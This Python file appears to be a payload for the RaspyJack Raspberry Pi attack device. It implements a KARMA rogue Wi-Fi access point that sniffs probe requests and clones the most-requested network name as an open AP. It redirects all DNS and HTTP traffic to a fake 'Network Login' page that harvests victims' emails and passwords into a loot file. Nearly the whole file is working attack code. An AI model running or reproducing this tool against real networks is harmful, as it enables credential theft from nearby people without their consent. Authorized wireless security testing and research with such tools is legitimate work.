#!/usr/bin/env python3
"""
RaspyJack Payload -- KARMA AP
===============================
Author: 7h30th3r0n3

Monitor WiFi probe requests to discover SSIDs that nearby devices
are searching for, then create a rogue AP using the most-probed SSID
to lure clients.

Setup / Prerequisites
---------------------
- USB WiFi dongle with monitor mode support (e.g. Alfa AWUS036ACH)
- apt install hostapd dnsmasq-base tcpdump
- Dongle is auto-detected on wlan1+ (onboard wlan0 is reserved for WebUI)

Steps:
  1) Monitor probe requests on USB dongle (monitor mode)
  2) Collect and rank probed SSIDs
  3) Launch hostapd cloning the top SSID
  4) Serve DHCP + DNS redirect + captive portal

Controls:
  KEY1      -- Start/stop probe monitoring
  OK        -- Launch AP with top SSID (or selected)
  UP / DOWN -- Scroll probed SSIDs
  KEY2      -- Show connected clients
  KEY3      -- Exit + full cleanup

Loot: /root/Raspyjack/loot/KarmaAP/
"""

import os
import sys
import re
import json
import time
import signal
import threading
import subprocess
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button

PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = LCD.width, LCD.height
font = scaled_font()

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
LOOT_DIR = "/root/Raspyjack/loot/KarmaAP"
os.makedirs(LOOT_DIR, exist_ok=True)

HOSTAPD_CONF = "/tmp/raspyjack_karma_hostapd.conf"
DNSMASQ_CONF = "/tmp/raspyjack_karma_dnsmasq.conf"
PORTAL_PORT = 80
GATEWAY_IP = "10.0.77.1"
DHCP_RANGE_START = "10.0.77.10"
DHCP_RANGE_END = "10.0.77.250"
ROWS_VISIBLE = 7

# ---------------------------------------------------------------------------
# WiFi helpers
# ---------------------------------------------------------------------------

def _is_onboard_wifi_iface(iface):
    """True for onboard Pi WiFi (SDIO/mmc path or brcmfmac driver)."""
    try:
        devpath = os.path.realpath(f"/sys/class/net/{iface}/device")
        if "mmc" in devpath:
            return True
    except Exception:
        pass
    try:
        driver = os.path.basename(
            os.path.realpath(f"/sys/class/net/{iface}/device/driver")
        )
        if driver == "brcmfmac":
            return True
    except Exception:
        pass
    return False


def _find_usb_wifi():
    """Find first USB WiFi interface (skip onboard)."""
    try:
        for name in sorted(os.listdir("/sys/class/net")):
            if not name.startswith("wlan"):
                continue
            if _is_onboard_wifi_iface(name):
                continue
            return name
    except Exception:
        pass
    return None


def _set_monitor_mode(iface):
    subprocess.run(["sudo", "ip", "link", "set", iface, "down"],
                   capture_output=True, timeout=5)
    subprocess.run(["sudo", "iw", "dev", iface, "set", "type", "monitor"],
                   capture_output=True, timeout=5)
    subprocess.run(["sudo", "ip", "link", "set", iface, "up"],
                   capture_output=True, timeout=5)


def _set_managed_mode(iface):
    subprocess.run(["sudo", "ip", "link", "set", iface, "down"],
                   capture_output=True, timeout=5)
    subprocess.run(["sudo", "iw", "dev", iface, "set", "type", "managed"],
                   capture_output=True, timeout=5)
    subprocess.run(["sudo", "ip", "link", "set", iface, "up"],
                   capture_output=True, timeout=5)


# ---------------------------------------------------------------------------
# Shared state
# ---------------------------------------------------------------------------
lock = threading.Lock()
probed_ssids = {}      # ssid -> count
scroll_pos = 0
monitoring = False
ap_running = False
status_msg = "Idle"
view_mode = "probes"   # probes | attack | clients
credentials = []
connected_clients = []

_monitor_proc = None
_hostapd_proc = None
_dnsmasq_proc = None
_portal_server = None
_iface = None

# ---------------------------------------------------------------------------
# Probe monitoring
# ---------------------------------------------------------------------------

def _probe_monitor_loop(iface):
    """Capture probe requests via tcpdump and extract SSIDs."""
    global _monitor_proc, monitoring

    _set_monitor_mode(iface)
    time.sleep(0.5)

    try:
        _monitor_proc = subprocess.Popen(
            ["sudo", "tcpdump", "-i", iface, "-e", "-l",
             "type", "mgt", "subtype", "probe-req"],
            stdout=subprocess.PIPE, stderr=subprocess.DEVNULL,
            text=True, bufsize=1,
        )
    except Exception as exc:
        with lock:
            monitoring = False
        return

    ssid_pattern = re.compile(r"Probe Request \(([^)]+)\)")
    alt_pattern = re.compile(r"SSID=\[([^\]]+)\]")

    while True:
        with lock:
            if not monitoring:
                break

        try:
            line = _monitor_proc.stdout.readline()
        except Exception:
            break

        if not line:
            if _monitor_proc.poll() is not None:
                break
            continue

        ssid = None
        match = ssid_pattern.search(line)
        if match:
            ssid = match.group(1).strip()
        if not ssid:
            match = alt_pattern.search(line)
            if match:
                ssid = match.group(1).strip()

        if ssid and ssid != "Broadcast" and len(ssid) > 0:
            with lock:
                probed_ssids[ssid] = probed_ssids.get(ssid, 0) + 1


def start_monitoring():
    """Start probe request monitoring."""
    global monitoring, status_msg
    if not _iface:
        with lock:
            status_msg = "No USB WiFi"
        return
    with lock:
        if monitoring:
            return
        monitoring = True
        status_msg = "Monitoring probes..."
    threading.Thread(target=_probe_monitor_loop, args=(_iface,), daemon=True).start()


def stop_monitoring():
    """Stop probe monitoring."""
    global monitoring, _monitor_proc, status_msg
    with lock:
        monitoring = False
    if _monitor_proc is not None:
        try:
            _monitor_proc.terminate()
            _monitor_proc.wait(timeout=3)
        except Exception:
            try:
                _monitor_proc.kill()
            except Exception:
                pass
        _monitor_proc = None
    with lock:
        status_msg = f"Stopped. {len(probed_ssids)} SSIDs"


# ---------------------------------------------------------------------------
# Sorted SSID list
# ---------------------------------------------------------------------------

def _get_sorted_ssids():
    """Return list of (ssid, count) sorted by count descending."""
    with lock:
        items = list(probed_ssids.items())
    items.sort(key=lambda x: x[1], reverse=True)
    return items


# ---------------------------------------------------------------------------
# AP launch
# ---------------------------------------------------------------------------

PORTAL_HTML = """<!DOCTYPE html>
<html><head><title>WiFi Login</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body{font-family:sans-serif;background:#eee;display:flex;
justify-content:center;align-items:center;min-height:100vh;margin:0}
.c{background:#fff;padding:28px;border-radius:8px;box-shadow:0 2px 8px
rgba(0,0,0,.12);max-width:340px;width:90%}
h2{margin-top:0;color:#222}
input{width:100%;padding:10px;margin:6px 0;border:1px solid #bbb;
border-radius:4px;box-sizing:border-box}
button{width:100%;padding:11px;background:#007bff;color:#fff;border:none;
border-radius:4px;cursor:pointer;font-size:15px}
</style></head>
<body><div class="c">
<h2>Network Login</h2>
<form method="POST" action="/login">
<input name="email" placeholder="Email" required>
<input name="password" type="password" placeholder="Password" required>
<button type="submit">Connect</button>
</form></div></body></html>"""


class _PortalHandler(BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        pass

    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(PORTAL_HTML.encode())

    def do_POST(self):
        clen = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(clen).decode("utf-8", errors="replace")
        params = parse_qs(body)
        email = params.get("email", [""])[0]
        password = params.get("password", [""])[0]
        if email or password:
            cred = {
                "timestamp": datetime.now().isoformat(),
                "email": email,
                "password": password,
                "ip": self.client_address[0],
            }
            with lock:
                credentials.append(cred)
            _save_cred(cred)
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(b"<html><body><h2>Connected!</h2></body></html>")


def _save_cred(cred):
    ts = datetime.now().strftime("%Y%m%d")
    path = os.path.join(LOOT_DIR, f"karma_creds_{ts}.json")
    existing = []
    if os.path.isfile(path):
        try:
            with open(path, "r") as f:
                existing = json.load(f)
        except Exception:
            existing = []
    existing.append(cred)
    with open(path, "w") as f:
        json.dump(existing, f, indent=2)


def _portal_loop():
    while True:
        with lock:
            if not ap_running:
                break
        try:
            if _portal_server:
                _portal_server.handle_request()
        except Exception:
            break


def _start_ap(ssid):
    """Launch rogue AP with given SSID."""
    global _hostapd_proc, _dnsmasq_proc, _portal_server
    global ap_running, status_msg, view_mode

    iface = _iface
    if not iface:
        with lock:
            status_msg = "No USB WiFi"
        return

    stop_monitoring()
    time.sleep(0.3)

    with lock:
        status_msg = f"Starting AP: {ssid[:12]}"
        view_mode = "attack"

    _set_managed_mode(iface)
    time.sleep(0.5)

    subprocess.run(["sudo", "ip", "addr", "flush", "dev", iface],
                   capture_output=True, timeout=5)
    subprocess.run(
        ["sudo", "ip", "addr", "add", f"{GATEWAY_IP}/24", "dev", iface],
        capture_output=True, timeout=5,
    )
    subprocess.run(["sudo", "ip", "link", "set", iface, "up"],
                   capture_output=True, timeout=5)

    # hostapd config
    with open(HOSTAPD_CONF, "w") as f:
        f.write(
            f"interface={iface}\ndriver=nl80211\nssid={ssid}\n"
            f"hw_mode=g\nchannel=6\nwmm_enabled=0\n"
            f"auth_algs=1\nwpa=0\n"
        )

    # dnsmasq config
    with open(DNSMASQ_CONF, "w") as f:
        f.write(
            f"interface={iface}\n"
            f"dhcp-range={DHCP_RANGE_START},{DHCP_RANGE_END},12h\n"
            f"dhcp-option=3,{GATEWAY_IP}\n"
            f"dhcp-option=6,{GATEWAY_IP}\n"
            f"address=/#/{GATEWAY_IP}\n"
            f"no-resolv\n"
        )

    for proc_name in ("hostapd", "dnsmasq"):
        subprocess.run(["sudo", "killall", proc_name],
                       capture_output=True, timeout=5)
    time.sleep(0.3)

    _hostapd_proc = subprocess.Popen(
        ["sudo", "hostapd", HOSTAPD_CONF],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE,
    )
    time.sleep(1.5)
    if _hostapd_proc.poll() is not None:
        with lock:
            status_msg = "hostapd failed"
        return

    _dnsmasq_proc = subprocess.Popen(
        ["sudo", "dnsmasq", "-C", DNSMASQ_CONF, "-d"],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE,
    )
    time.sleep(0.5)

    # iptables
    for cmd in [
        ["sudo", "iptables", "-t", "nat", "-F"],
        ["sudo", "iptables", "-F"],
        ["sudo", "iptables", "-t", "nat", "-A", "PREROUTING",
         "-i", iface, "-p", "tcp", "--dport", "80",
         "-j", "DNAT", "--to-destination", f"{GATEWAY_IP}:{PORTAL_PORT}"],
        ["sudo", "iptables", "-t", "nat", "-A", "PREROUTING",
         "-i", iface, "-p", "udp", "--dport", "53",
         "-j", "DNAT", "--to-destination", f"{GATEWAY_IP}:53"],
        ["sudo", "iptables", "-t", "nat", "-A", "POSTROUTING",
         "-j", "MASQUERADE"],
        ["sudo", "sh", "-c", "echo 1 > /proc/sys/net/ipv4/ip_forward"],
    ]:
        subprocess.run(cmd, capture_output=True, timeout=5)

    try:
        _portal_server = HTTPServer(("0.0.0.0", PORTAL_PORT), _PortalHandler)
        _portal_server.timeout = 1
        with lock:
            ap_running = True
        threading.Thread(target=_portal_loop, daemon=True).start()
    except OSError as exc:
        with lock:
            status_msg = f"Portal err: {str(exc)[:16]}"
        return

    with lock:
        status_msg = f"AP live: {ssid[:14]}"

    # Save probed SSIDs to loot
    _save_probes()


def _save_probes():
    """Export probed SSIDs to loot."""
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    path = os.path.join(LOOT_DIR, f"probes_{ts}.json")
    with lock:
        data = dict(probed_ssids)
    with open(path, "w") as f:
        json.dump(data, f, indent=2)


def _stop_ap():
    """Stop AP and clean up all processes."""
    global _hostapd_proc, _dnsmasq_proc, _portal_server, ap_running, status_msg

    with lock:
        ap_running = False

    if _hostapd_proc:
        try:
            _hostapd_proc.terminate()
            _hostapd_proc.wait(timeout=3)
        except Exception:
            try:
                _hostapd_proc.kill()
            except Exception:
                pass
        _hostapd_proc = None

    if _dnsmasq_proc:
        try:
            _dnsmasq_proc.terminate()
            _dnsmasq_proc.wait(timeout=3)
        except Exception:
            try:
                _dnsmasq_proc.kill()
            except Exception:
                pass
        _dnsmasq_proc = None

    for proc_name in ("hostapd", "dnsmasq"):
        subprocess.run(["sudo", "killall", "-9", proc_name],
                       capture_output=True, timeout=5)

    if _portal_server:
        try:
            _portal_server.server_close()
        except Exception:
            pass
        _portal_server = None

    # iptables cleanup
    for cmd in [
        ["sudo", "iptables", "-t", "nat", "-F"],
        ["sudo", "iptables", "-F"],
        ["sudo", "sh", "-c", "echo 0 > /proc/sys/net/ipv4/ip_forward"],
    ]:
        try:
            subprocess.run(cmd, capture_output=True, timeout=5)
        except Exception:
            pass

    if _iface:
        _set_managed_mode(_iface)
        subprocess.run(["sudo", "ip", "addr", "flush", "dev", _iface],
                       capture_output=True, timeout=5)

    for fpath in (HOSTAPD_CONF, DNSMASQ_CONF):
        try:
            os.remove(fpath)
        except OSError:
            pass

    with lock:
        status_msg = "AP stopped"


# ---------------------------------------------------------------------------
# Client listing
# ---------------------------------------------------------------------------

def _get_connected_clients():
    """Parse dnsmasq leases for connected clients."""
    clients = []
    lease_file = "/var/lib/misc/dnsmasq.leases"
    try:
        if os.path.isfile(lease_file):
            with open(lease_file, "r") as f:
                for line in f:
                    parts = line.strip().split()
                    if len(parts) >= 4:
                        clients.append({
                            "mac": parts[1],
                            "ip": parts[2],
                            "hostname": parts[3] if len(parts) > 3 else "?",
                        })
    except Exception:
        pass
    return clients


# ---------------------------------------------------------------------------
# Drawing
# ---------------------------------------------------------------------------

def _draw_header(d, title):
    d.rectangle((0, 0, 127, 13), fill="#111")
    d.text((2, 1), title, font=font, fill="#FF6600")
    with lock:
        active = ap_running or monitoring
    d.ellipse((118, 3, 122, 7), fill="#00FF00" if active else "#FF0000")


def _draw_footer(d, text):
    d.rectangle((0, 116, 127, 127), fill="#111")
    d.text((2, 117), text[:24], font=font, fill="#AAA")


def draw_probes_view():
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    _draw_header(d, "KARMA AP")

    with lock:
        msg = status_msg
        mon = monitoring
        sc = scroll_pos

    d.text((2, 15), msg[:22], font=font, fill="#FFAA00")

    ssids = _get_sorted_ssids()
    if not ssids:
        d.text((10, 50), "No probes yet", font=font, fill="#666")
        d.text((10, 64), "K1 to start monitoring", font=font, fill="#666")
    else:
        visible = ssids[sc:sc + ROWS_VISIBLE]
        for i, (ssid, count) in enumerate(visible):
            y = 28 + i * 12
            color = "#FFFF00" if i == 0 and sc == scroll_pos else "#CCCCCC"
            if i == 0:
                color = "#FFFF00"
            line = f"{ssid[:16]} ({count})"
            d.text((2, y), line[:22], font=font, fill=color)

    mon_label = "K1:Stop" if mon else "K1:Monitor"
    _draw_footer(d, f"OK:AP {mon_label} K3:X")
    LCD.LCD_ShowImage(img, 0, 0)


def draw_attack_view():
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    _draw_header(d, "KARMA AP")

    with lock:
        msg = status_msg
        cred_count = len(credentials)
        running = ap_running

    clients = _get_connected_clients()
    y = 18
    d.text((2, y), msg[:22], font=font, fill="#00FF00" if running else "#FF4444")
    y += 16
    d.text((2, y), f"Clients: {len(clients)}", font=font, fill="white")
    y += 14
    d.text((2, y), f"Creds: {cred_count}", font=font, fill="#FFAA00")

    if cred_count > 0:
        y += 14
        last = credentials[-1]
        d.text((2, y), f"Last: {last['email'][:18]}", font=font, fill="#00CCFF")

    _draw_footer(d, "K2:Clients OK:Stop K3:X")
    LCD.LCD_ShowImage(img, 0, 0)


def draw_clients_view():
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    _draw_header(d, "CLIENTS")

    clients = _get_connected_clients()
    with lock:
        sc = scroll_pos

    if not clients:
        d.text((10, 50), "No clients", font=font, fill="#666")
    else:
        visible = clients[sc:sc + 6]
        for i, cl in enumerate(visible):
            y = 18 + i * 16
            d.text((2, y), f"{cl['ip']}", font=font, fill="#00CCFF")
            d.text((2, y + 10), f"  {cl['mac']}", font=font, fill="#888")

    _draw_footer(d, f"{len(clients)} clients  K3:Back")
    LCD.LCD_ShowImage(img, 0, 0)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    global _iface, scroll_pos, view_mode, status_msg

    _iface = _find_usb_wifi()
    if not _iface:
        with lock:
            status_msg = "No USB WiFi dongle!"

    # Splash
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    d.text((16, 16), "KARMA AP", font=font, fill="#FF6600")
    d.text((4, 36), "Capture probe requests", font=font, fill="#888")
    d.text((4, 48), "& create rogue AP", font=font, fill="#888")
    iface_txt = _iface if _iface else "NONE"
    d.text((4, 66), f"Iface: {iface_txt}", font=font, fill="#666")
    d.text((4, 82), "K1=Monitor OK=LaunchAP", font=font, fill="#666")
    d.text((4, 94), "K2=Clients K3=Exit", font=font, fill="#666")
    LCD.LCD_ShowImage(img, 0, 0)
    time.sleep(0.5)

    try:
        while True:
            btn = get_button(PINS, GPIO)

            if btn == "KEY3":
                if view_mode == "clients":
                    with lock:
                        view_mode = "attack" if ap_running else "probes"
                        scroll_pos = 0
                    time.sleep(0.25)
                    continue
                break

            if view_mode == "probes":
                if btn == "KEY1":
                    with lock:
                        mon = monitoring
                    if mon:
                        stop_monitoring()
                    else:
                        start_monitoring()
                    time.sleep(0.3)
                elif btn == "UP":
                    with lock:
                        scroll_pos = max(0, scroll_pos - 1)
                    time.sleep(0.15)
                elif btn == "DOWN":
                    ssids = _get_sorted_ssids()
                    with lock:
                        scroll_pos = min(max(0, len(ssids) - 1), scroll_pos + 1)
                    time.sleep(0.15)
                elif btn == "OK":
                    ssids = _get_sorted_ssids()
                    if ssids:
                        with lock:
                            idx = min(scroll_pos, len(ssids) - 1)
                        target_ssid = ssids[idx][0]
                        threading.Thread(
                            target=_start_ap, args=(target_ssid,), daemon=True,
                        ).start()
                    time.sleep(0.3)
                draw_probes_view()

            elif view_mode == "attack":
                if btn == "OK":
                    with lock:
                        running = ap_running
                    if running:
                        threading.Thread(target=_stop_ap, daemon=True).start()
                        with lock:
                            view_mode = "probes"
                    time.sleep(0.3)
                elif btn == "KEY2":
                    with lock:
                        view_mode = "clients"
                        scroll_pos = 0
                    time.sleep(0.25)
                draw_attack_view()

            elif view_mode == "clients":
                if btn == "UP":
                    with lock:
                        scroll_pos = max(0, scroll_pos - 1)
                    time.sleep(0.15)
                elif btn == "DOWN":
                    clients = _get_connected_clients()
                    with lock:
                        scroll_pos = min(max(0, len(clients) - 1), scroll_pos + 1)
                    time.sleep(0.15)
                draw_clients_view()

            time.sleep(0.05)

    finally:
        stop_monitoring()
        _stop_ap()
        try:
            LCD.LCD_Clear()
        except Exception:
            pass
        GPIO.cleanup()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
